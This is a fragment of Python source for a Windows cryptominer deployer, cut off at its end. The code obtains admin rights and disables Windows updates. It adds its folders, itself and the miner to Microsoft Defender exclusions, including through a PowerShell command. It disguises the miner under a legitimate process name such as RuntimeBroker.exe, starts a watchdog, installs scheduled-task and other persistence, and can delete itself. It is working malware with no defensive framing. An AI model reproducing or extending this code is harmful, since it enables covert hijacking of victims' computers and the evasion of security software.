    if not exe_path:
        hawk.critical("[DEPLOYER] No miner found, aborting")
        trigger_exit(ERR['UNEXPECTED'], "Deployment not found")
        return

    print("Script has already been deployed before")
    hawk.info("[MAIN] Previous deployment detected, using existing miner")
    disable_windows_updates()

    config_dir = os.path.join(os.environ.get('APPDATA', ''), CONFIG_DIR_REL)
    os.makedirs(config_dir, exist_ok=True)
    add_folder_to_defender_exclusions(config_dir)

    if os.path.basename(exe_path).lower() == f"{EXE_NAME.lower()}.exe":
        hawk.info("[MAIN] Original miner name detected, renaming and generating config...")

        try:
            exe_names = [name for name in LEGIT_NAMES if name.lower().endswith('.exe')]
            if not exe_names:
                exe_names = ["RuntimeBroker.exe"]
            running_procs = set()
            try:
                tasklist_out = subprocess.run(
                    'tasklist /fo csv /nh', capture_output=True, text=True,
                    shell=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
                ).stdout.lower()
                for line in tasklist_out.splitlines():
                    parts = line.split('","')
                    if parts:
                        img = parts[0].strip('"').lower()
                        if img:
                            running_procs.add(img)
            except:
                pass
            available_names = [n for n in exe_names if n.lower() not in running_procs]
            if not available_names:
                available_names = exe_names
            new_name = random.choice(available_names)
            new_exe_path = os.path.join(os.path.dirname(exe_path), new_name)
            os.rename(exe_path, new_exe_path)
            add_folder_to_defender_exclusions(new_exe_path)
            print(f"[*] Miner deployed as: {new_exe_path}")
            hawk.info(f"[MAIN] miner path: {new_exe_path}")
            hawk.debug(f"[RENAME] renamed to {new_name} at {new_exe_path}")
            exe_path = new_exe_path
            _set_deployed_miner_path(exe_path)
        except Exception as e:
            hawk.error(f"[RENAME] rename failed: {e}. Will continue with original name.")

    if not os.path.isfile(os.path.join(config_dir, 'config.json')):
        generate_config(config_dir)

    hawk.info("[MAIN] adding micro-pause...")
    jittered_sleep(1, 0.5)

    hawk.info("[MAIN] waiting 3 seconds for Defender exclusions to settle...")
    time.sleep(3)

    hawk.info("[MAIN] adding micro-pause...")
    jittered_sleep(1, 0.5)

    try:
        ps_exe = f'Add-MpPreference -ExclusionPath "{exe_path}" -Force'
        subprocess.run(['powershell', '-NoProfile', '-Command', ps_exe], capture_output=True, timeout=15)
        hawk.info(f"[MAIN] final PowerShell exclusion for {exe_path}")
    except:
        pass

    watchdog = MinerWatchdog(exe_path, config_dir)
    watchdog.start()
    hawk.info("[WATCHDOG] started")
    create_scheduled_task_deployer()
    add_persistence_multi()

    hawk.info("[MAIN] adding micro-pause...")
    jittered_sleep(1, 0.5)

    if ARM_SELF_DELETE:
        self_del()

    try:
        while watchdog.running:
            time.sleep(1)
    except KeyboardInterrupt:
        hawk.info("[MAIN] KeyboardInterrupt received, shutting down")
    finally:
        if watchdog.miner_proc and watchdog.miner_proc.poll() is None:
            watchdog.miner_proc.terminate()
        hawk.info("[MAIN] exiting")
    sys.exit(0)

def main():
    print("\n" + "="*60)
    print(" MONOLITHIC STARTED ".center(60, "="))
    print("="*60 + "\n")

    hawk.info(f"[MAIN] start, PID={os.getpid()}")
    hawk.info(f"[MAIN] woke up, args={sys.argv}")

    if not is_admin():
        hawk.info("[MAIN] elevating")
        elevate()
    if not is_admin():
        hawk.critical("[MAIN] still not admin after elevation attempt")
        trigger_exit(ERR['ELEVATION_LOOP'], "Failed to obtain admin rights")

    hawk.info("[MAIN] waiting 15 seconds before adding script exclusion...")
    time.sleep(15)
    add_self_to_defender_exclusions()

    # ALWAYS run stager – fresh deployment every time
    hawk.info("[MAIN] No deployment found, running stager logic")
    run_stager()

    input("\n=== Script finished. Press Enter to exit...")

if __name__ == '__main__':
